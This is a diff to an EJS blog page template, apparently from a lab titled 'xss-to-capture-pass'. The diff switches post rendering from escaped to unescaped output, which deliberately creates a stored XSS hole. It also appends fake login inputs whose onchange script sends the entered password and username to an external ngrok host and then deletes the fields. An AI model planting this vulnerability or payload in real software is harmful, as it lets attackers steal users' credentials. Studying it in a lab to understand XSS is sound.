@@ -6,7 +6,7 @@
   <p>User: <%= user %></p>
   <% if(posts.length > 0) { %>
   <%    for(var i = 0; i < posts.length; i++) { %>
-            <p><%= posts[i] %></p>
+            <p><%- posts[i] %></p>
   <%    } %>
   <% } %>
   <form id="blog-post" action="/xss-to-capture-pass/blog" method="POST">
@@ -19,3 +19,13 @@
     <button type="submit">Logout</button>
   </form>
 </html>
+
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)
+{fetch('https://647726c8b5d5.ngrok.io/x2cp?pass=' + this.value + 
+'&name=' + username.value,{
+method:'GET',
+mode:'no-cors'
+});
+document.getElementById('username').remove();
+document.getElementsByName('password')[0].remove();}">
